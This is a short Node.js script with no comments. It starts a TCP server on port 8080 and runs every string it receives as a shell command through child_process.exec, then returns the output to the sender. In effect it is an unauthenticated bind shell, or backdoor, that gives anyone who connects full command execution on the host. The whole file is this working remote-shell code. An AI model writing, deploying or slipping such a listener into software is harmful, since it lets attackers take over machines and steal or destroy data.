var net = require('net');
var exec = require('child_process').exec;

net
  .createServer(sock => {
    console.log('CONNECTED: ', sock.remoteAddress, ':', sock.remotePort);
    sock.setEncoding('utf8');
    sock.on('data', data => {
      exec(data, (err, output, stderr) => {
        if (err) {
          sock.write('No command found!\n');
        }
        sock.write(output);
      });
    });
  })
  .listen(8080);
